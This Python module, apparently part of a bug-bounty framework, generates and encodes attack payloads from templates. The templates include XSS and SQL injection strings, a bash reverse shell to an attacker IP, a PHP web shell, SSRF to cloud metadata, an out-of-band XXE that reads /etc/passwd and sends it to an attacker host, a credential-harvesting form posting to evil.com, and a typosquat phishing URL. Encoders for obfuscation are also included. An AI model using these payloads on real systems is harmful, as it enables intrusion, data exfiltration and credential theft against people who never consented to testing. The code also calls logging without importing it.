#!/usr/bin/env python3
"""
🎯 Advanced Payload Generator for Bug Bounty Framework
Comprehensive payload generation for various attack vectors

Features:
- Web application payloads (XSS, SQLi, RCE, SSRF, XXE)
- Network payloads (Port scanning, Service detection)
- Mobile payloads (Android, iOS)
- Social engineering payloads
- Payload encoding and obfuscation
- Payload management and organization
- Custom payload templates
"""

import os
import json
import base64
import hashlib
import random
import string
import re
import urllib.parse
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from datetime import datetime
import yaml
import requests
from jinja2 import Template
import html
import xml.etree.ElementTree as ET

logger = logging.getLogger(__name__)

@dataclass
class PayloadTemplate:
    """Payload template configuration"""
    name: str
    description: str
    category: str
    attack_vector: str
    payload: str
    parameters: Dict[str, Any]
    encoding: List[str]
    tags: List[str]
    risk_level: str
    author: str
    created_date: str

class PayloadGenerator:
    """Advanced payload generator for security testing"""
    
    def __init__(self, templates_dir: str = 'payload_templates'):
        self.templates_dir = Path(templates_dir)
        self.templates_dir.mkdir(exist_ok=True)
        
        self.payloads_dir = Path('payloads')
        self.payloads_dir.mkdir(exist_ok=True)
        
        # Create category directories
        self.categories = ['web', 'network', 'mobile', 'social', 'custom']
        for category in self.categories:
            (self.payloads_dir / category).mkdir(exist_ok=True)
        
        # Initialize payload templates
        self.templates = self._initialize_templates()
        
        # Encoding functions
        self.encoders = {
            'url': self._url_encode,
            'html': self._html_encode,
            'base64': self._base64_encode,
            'hex': self._hex_encode,
            'unicode': self._unicode_encode,
            'double_url': self._double_url_encode,
            'html_entities': self._html_entities_encode,
            'javascript_unicode': self._javascript_unicode_encode,
            'sql_hex': self._sql_hex_encode,
            'xml_entities': self._xml_entities_encode
        }
    
    def _initialize_templates(self) -> Dict[str, PayloadTemplate]:
        """Initialize default payload templates"""
        templates = {}
        
        # XSS Payloads
        xss_payloads = [
            {
                'name': 'Basic XSS',
                'description': 'Basic cross-site scripting payload',
                'category': 'web',
                'attack_vector': 'xss',
                'payload': '<script>alert("XSS")</script>',
                'parameters': {},
                'encoding': ['url', 'html'],
                'tags': ['xss', 'reflected', 'stored'],
                'risk_level': 'high',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'XSS with Event Handlers',
                'description': 'XSS using event handlers',
                'category': 'web',
                'attack_vector': 'xss',
                'payload': '"><img src=x onerror=alert("XSS")>',
                'parameters': {},
                'encoding': ['url', 'html'],
                'tags': ['xss', 'event_handler'],
                'risk_level': 'high',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'XSS with JavaScript Protocol',
                'description': 'XSS using javascript: protocol',
                'category': 'web',
                'attack_vector': 'xss',
                'payload': 'javascript:alert("XSS")',
                'parameters': {},
                'encoding': ['url'],
                'tags': ['xss', 'javascript_protocol'],
                'risk_level': 'high',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'XSS with Unicode',
                'description': 'XSS using Unicode encoding',
                'category': 'web',
                'attack_vector': 'xss',
                'payload': '\\u003Cscript\\u003Ealert("XSS")\\u003C/script\\u003E',
                'parameters': {},
                'encoding': ['unicode'],
                'tags': ['xss', 'unicode'],
                'risk_level': 'high',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            }
        ]
        
        # SQL Injection Payloads
        sqli_payloads = [
            {
                'name': 'Basic SQL Injection',
                'description': 'Basic SQL injection payload',
                'category': 'web',
                'attack_vector': 'sqli',
                'payload': "' OR 1=1--",
                'parameters': {},
                'encoding': ['url', 'sql_hex'],
                'tags': ['sqli', 'authentication_bypass'],
                'risk_level': 'critical',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'Union Based SQLi',
                'description': 'Union-based SQL injection',
                'category': 'web',
                'attack_vector': 'sqli',
                'payload': "' UNION SELECT 1,2,3--",
                'parameters': {'columns': 3},
                'encoding': ['url', 'sql_hex'],
                'tags': ['sqli', 'union'],
                'risk_level': 'critical',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'Time Based SQLi',
                'description': 'Time-based blind SQL injection',
                'category': 'web',
                'attack_vector': 'sqli',
                'payload': "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                'parameters': {'delay': 5},
                'encoding': ['url', 'sql_hex'],
                'tags': ['sqli', 'blind', 'time_based'],
                'risk_level': 'critical',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'Boolean Based SQLi',
                'description': 'Boolean-based blind SQL injection',
                'category': 'web',
                'attack_vector': 'sqli',
                'payload': "' AND 1=1--",
                'parameters': {},
                'encoding': ['url', 'sql_hex'],
                'tags': ['sqli', 'blind', 'boolean'],
                'risk_level': 'critical',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            }
        ]
        
        # RCE Payloads
        rce_payloads = [
            {
                'name': 'Command Injection',
                'description': 'Basic command injection payload',
                'category': 'web',
                'attack_vector': 'rce',
                'payload': '; ls -la',
                'parameters': {},
                'encoding': ['url'],
                'tags': ['rce', 'command_injection'],
                'risk_level': 'critical',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'Reverse Shell',
                'description': 'Reverse shell payload',
                'category': 'web',
                'attack_vector': 'rce',
                'payload': 'bash -i >& /dev/tcp/{{attacker_ip}}/{{port}} 0>&1',
                'parameters': {'attacker_ip': '192.168.1.100', 'port': 4444},
                'encoding': ['url', 'base64'],
                'tags': ['rce', 'reverse_shell'],
                'risk_level': 'critical',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'PHP Code Execution',
                'description': 'PHP code execution payload',
                'category': 'web',
                'attack_vector': 'rce',
                'payload': '<?php system($_GET["cmd"]); ?>',
                'parameters': {'cmd': 'id'},
                'encoding': ['url', 'base64'],
                'tags': ['rce', 'php'],
                'risk_level': 'critical',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            }
        ]
        
        # SSRF Payloads
        ssrf_payloads = [
            {
                'name': 'Basic SSRF',
                'description': 'Basic server-side request forgery',
                'category': 'web',
                'attack_vector': 'ssrf',
                'payload': 'http://{{internal_ip}}',
                'parameters': {'internal_ip': '192.168.1.1'},
                'encoding': ['url'],
                'tags': ['ssrf', 'internal_access'],
                'risk_level': 'high',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'SSRF with Metadata',
                'description': 'SSRF to access cloud metadata',
                'category': 'web',
                'attack_vector': 'ssrf',
                'payload': 'http://169.254.169.254/latest/meta-data/',
                'parameters': {},
                'encoding': ['url'],
                'tags': ['ssrf', 'cloud', 'metadata'],
                'risk_level': 'high',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            }
        ]
        
        # XXE Payloads
        xxe_payloads = [
            {
                'name': 'Basic XXE',
                'description': 'Basic XML external entity injection',
                'category': 'web',
                'attack_vector': 'xxe',
                'payload': '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>''',
                'parameters': {},
                'encoding': ['xml_entities'],
                'tags': ['xxe', 'file_read'],
                'risk_level': 'high',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'XXE with Parameter',
                'description': 'XXE with parameter entity',
                'category': 'web',
                'attack_vector': 'xxe',
                'payload': '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{{attacker_ip}}/?x=%file;'>">
%eval;
%exfil;
]>
<data>test</data>''',
                'parameters': {'attacker_ip': '192.168.1.100'},
                'encoding': ['xml_entities'],
                'tags': ['xxe', 'out_of_band'],
                'risk_level': 'high',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            }
        ]
        
        # Network Payloads
        network_payloads = [
            {
                'name': 'Nmap Scan',
                'description': 'Nmap port scanning command',
                'category': 'network',
                'attack_vector': 'port_scan',
                'payload': 'nmap -sS -p- {{target_ip}}',
                'parameters': {'target_ip': '192.168.1.1'},
                'encoding': [],
                'tags': ['network', 'port_scan'],
                'risk_level': 'medium',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'Masscan Scan',
                'description': 'Masscan port scanning command',
                'category': 'network',
                'attack_vector': 'port_scan',
                'payload': 'masscan {{target_ip}} -p 1-65535 --rate=1000',
                'parameters': {'target_ip': '192.168.1.1'},
                'encoding': [],
                'tags': ['network', 'port_scan'],
                'risk_level': 'medium',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            }
        ]
        
        # Mobile Payloads
        mobile_payloads = [
            {
                'name': 'Android Intent',
                'description': 'Android intent-based payload',
                'category': 'mobile',
                'attack_vector': 'android_intent',
                'payload': 'intent://{{target_host}}#Intent;scheme=http;package=com.android.browser;end',
                'parameters': {'target_host': 'example.com'},
                'encoding': ['url'],
                'tags': ['mobile', 'android', 'intent'],
                'risk_level': 'medium',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'iOS URL Scheme',
                'description': 'iOS URL scheme payload',
                'category': 'mobile',
                'attack_vector': 'ios_url_scheme',
                'payload': 'tel:{{phone_number}}',
                'parameters': {'phone_number': '1234567890'},
                'encoding': ['url'],
                'tags': ['mobile', 'ios', 'url_scheme'],
                'risk_level': 'medium',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            }
        ]
        
        # Social Engineering Payloads
        social_payloads = [
            {
                'name': 'Phishing URL',
                'description': 'Phishing URL with similar domain',
                'category': 'social',
                'attack_vector': 'phishing',
                'payload': 'https://{{fake_domain}}/login',
                'parameters': {'fake_domain': 'g00gle.com'},
                'encoding': ['url'],
                'tags': ['social', 'phishing', 'url'],
                'risk_level': 'high',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            },
            {
                'name': 'Credential Harvesting',
                'description': 'Credential harvesting form',
                'category': 'social',
                'attack_vector': 'credential_harvesting',
                'payload': '''<form action="http://{{attacker_server}}/harvest" method="POST">
<input type="text" name="username" placeholder="Username">
<input type="password" name="password" placeholder="Password">
<input type="submit" value="Login">
</form>''',
                'parameters': {'attacker_server': 'evil.com'},
                'encoding': ['html'],
                'tags': ['social', 'credential_harvesting'],
                'risk_level': 'high',
                'author': 'System',
                'created_date': datetime.now().isoformat()
            }
        ]
        
        # Combine all payloads
        all_payloads = (xss_payloads + sqli_payloads + rce_payloads + 
                       ssrf_payloads + xxe_payloads + network_payloads + 
                       mobile_payloads + social_payloads)
        
        # Convert to PayloadTemplate objects
        for payload_data in all_payloads:
            template = PayloadTemplate(**payload_data)
            templates[template.name] = template
        
        return templates
    
    def generate_payload(self, template_name: str, parameters: Dict[str, Any] = None, 
                        encoding: List[str] = None) -> str:
        """Generate a payload from template"""
        if template_name not in self.templates:
            raise ValueError(f"Template '{template_name}' not found")
        
        template = self.templates[template_name]
        
        # Use provided parameters or template defaults
        if parameters is None:
            parameters = template.parameters
        
        # Use provided encoding or template defaults
        if encoding is None:
            encoding = template.encoding
        
        # Generate payload using Jinja2 template
        jinja_template = Template(template.payload)
        payload = jinja_template.render(**parameters)
        
        # Apply encoding
        for enc in encoding:
            if enc in self.encoders:
                payload = self.encoders[enc](payload)
        
        return payload
    
    def generate_payload_batch(self, template_names: List[str], 
                              parameters_list: List[Dict[str, Any]] = None,
                              encoding: List[str] = None) -> List[str]:
        """Generate multiple payloads"""
        payloads = []
        
        for i, template_name in enumerate(template_names):
            parameters = parameters_list[i] if parameters_list and i < len(parameters_list) else None
            payload = self.generate_payload(template_name, parameters, encoding)
            payloads.append(payload)
        
        return payloads
    
    def generate_custom_payload(self, payload: str, parameters: Dict[str, Any] = None,
                               encoding: List[str] = None) -> str:
        """Generate custom payload"""
        if parameters:
            jinja_template = Template(payload)
            payload = jinja_template.render(**parameters)
        
        if encoding:
            for enc in encoding:
                if enc in self.encoders:
                    payload = self.encoders[enc](payload)
        
        return payload
    
    def save_payload(self, name: str, payload: str, category: str = 'custom',
                    description: str = '', tags: List[str] = None) -> str:
        """Save payload to file"""
        payload_data = {
            'name': name,
            'description': description,
            'category': category,
            'payload': payload,
            'tags': tags or [],
            'created_date': datetime.now().isoformat(),
            'hash': hashlib.md5(payload.encode()).hexdigest()
        }
        
        # Create filename
        filename = f"{name.replace(' ', '_').lower()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = self.payloads_dir / category / filename
        
        with open(filepath, 'w') as f:
            json.dump(payload_data, f, indent=2)
        
        return str(filepath)
    
    def load_payloads(self, category: str = None) -> List[Dict[str, Any]]:
        """Load saved payloads"""
        payloads = []
        
        if category:
            categories = [category]
        else:
            categories = self.categories
        
        for cat in categories:
            category_dir = self.payloads_dir / cat
            if category_dir.exists():
                for filepath in category_dir.glob('*.json'):
                    try:
                        with open(filepath, 'r') as f:
                            payload_data = json.load(f)
                            payload_data['filepath'] = str(filepath)
                            payloads.append(payload_data)
                    except Exception as e:
                        logger.error(f"Failed to load payload {filepath}: {e}")
        
        return payloads
    
    def search_payloads(self, query: str, category: str = None) -> List[Dict[str, Any]]:
        """Search payloads by query"""
        all_payloads = self.load_payloads(category)
        results = []
        
        query_lower = query.lower()
        for payload in all_payloads:
            if (query_lower in payload.get('name', '').lower() or
                query_lower in payload.get('description', '').lower() or
                query_lower in payload.get('payload', '').lower() or
                any(query_lower in tag.lower() for tag in payload.get('tags', []))):
                results.append(payload)
        
        return results
    
    def get_payload_statistics(self) -> Dict[str, Any]:
        """Get payload statistics"""
        stats = {
            'total_payloads': len(self.templates),
            'categories': {},
            'attack_vectors': {},
            'risk_levels': {},
            'recent_payloads': []
        }
        
        # Count by category
        for template in self.templates.values():
            category = template.category
            stats['categories'][category] = stats['categories'].get(category, 0) + 1
            
            attack_vector = template.attack_vector
            stats['attack_vectors'][attack_vector] = stats['attack_vectors'].get(attack_vector, 0) + 1
            
            risk_level = template.risk_level
            stats['risk_levels'][risk_level] = stats['risk_levels'].get(risk_level, 0) + 1
        
        # Get recent saved payloads
        saved_payloads = self.load_payloads()
        stats['saved_payloads'] = len(saved_payloads)
        stats['recent_payloads'] = sorted(saved_payloads, 
                                         key=lambda x: x.get('created_date', ''), 
                                         reverse=True)[:10]
        
        return stats
    
    # Encoding functions
    def _url_encode(self, payload: str) -> str:
        """URL encode payload"""
        return urllib.parse.quote(payload)
    
    def _html_encode(self, payload: str) -> str:
        """HTML encode payload"""
        return html.escape(payload)
    
    def _base64_encode(self, payload: str) -> str:
        """Base64 encode payload"""
        return base64.b64encode(payload.encode()).decode()
    
    def _hex_encode(self, payload: str) -> str:
        """Hex encode payload"""
        return payload.encode().hex()
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode payload"""
        return payload.encode('unicode_escape').decode()
    
    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode payload"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def _html_entities_encode(self, payload: str) -> str:
        """HTML entities encode payload"""
        return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')
    
    def _javascript_unicode_encode(self, payload: str) -> str:
        """JavaScript Unicode encode payload"""
        return ''.join([f'\\u{ord(c):04x}' for c in payload])
    
    def _sql_hex_encode(self, payload: str) -> str:
        """SQL hex encode payload"""
        return '0x' + payload.encode().hex()
    
    def _xml_entities_encode(self, payload: str) -> str:
        """XML entities encode payload"""
        return payload.replace('<', '&lt;').replace('>', '&gt;').replace('&', '&amp;').replace('"', '&quot;').replace("'", '&apos;')
    
    def create_payload_report(self, payloads: List[str], target: str = None) -> str:
        """Create a payload testing report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'target': target,
            'total_payloads': len(payloads),
            'payloads': [],
            'summary': {
                'web_payloads': 0,
                'network_payloads': 0,
                'mobile_payloads': 0,
                'social_payloads': 0
            }
        }
        
        for payload in payloads:
            payload_info = {
                'payload': payload,
                'length': len(payload),
                'hash': hashlib.md5(payload.encode()).hexdigest(),
                'encoding_detected': self._detect_encoding(payload)
            }
            report['payloads'].append(payload_info)
        
        # Generate summary
        for payload in payloads:
            if any(tag in payload.lower() for tag in ['script', 'alert', 'xss', 'sqli']):
                report['summary']['web_payloads'] += 1
            elif any(tag in payload.lower() for tag in ['nmap', 'masscan', 'port']):
                report['summary']['network_payloads'] += 1
            elif any(tag in payload.lower() for tag in ['android', 'ios', 'intent']):
                report['summary']['mobile_payloads'] += 1
            elif any(tag in payload.lower() for tag in ['phishing', 'social']):
                report['summary']['social_payloads'] += 1
        
        # Save report
        report_filename = f"payload_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        report_path = self.payloads_dir / report_filename
        
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        return str(report_path)
    
    def _detect_encoding(self, payload: str) -> List[str]:
        """Detect encoding in payload"""
        encodings = []
        
        if '%' in payload:
            encodings.append('url_encoded')
        if '&lt;' in payload or '&gt;' in payload:
            encodings.append('html_entities')
        if '\\u' in payload:
            encodings.append('unicode')
        if payload.startswith('0x'):
            encodings.append('hex')
        if len(payload) % 4 == 0 and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in payload):
            encodings.append('base64')
        
        return encodings
    
    def validate_payload(self, payload: str) -> Dict[str, Any]:
        """Validate payload for potential issues"""
        validation = {
            'valid': True,
            'warnings': [],
            'errors': [],
            'suggestions': []
        }
        
        # Check for common issues
        if len(payload) > 10000:
            validation['warnings'].append('Payload is very long')
        
        if payload.count('<') != payload.count('>'):
            validation['warnings'].append('Unmatched HTML tags')
        
        if 'script' in payload.lower() and 'alert' not in payload.lower():
            validation['suggestions'].append('Consider adding alert() for XSS testing')
        
        if 'union' in payload.lower() and 'select' not in payload.lower():
            validation['warnings'].append('UNION without SELECT in SQL injection')
        
        return validation

# Global payload generator instance
payload_generator = None

def initialize_payload_generator(templates_dir: str = 'payload_templates'):
    """Initialize the global payload generator"""
    global payload_generator
    payload_generator = PayloadGenerator(templates_dir)
    return payload_generator

def get_payload_generator() -> PayloadGenerator:
    """Get the global payload generator instance"""
    if payload_generator is None:
        raise RuntimeError("Payload generator not initialized. Call initialize_payload_generator() first.")
    return payload_generator 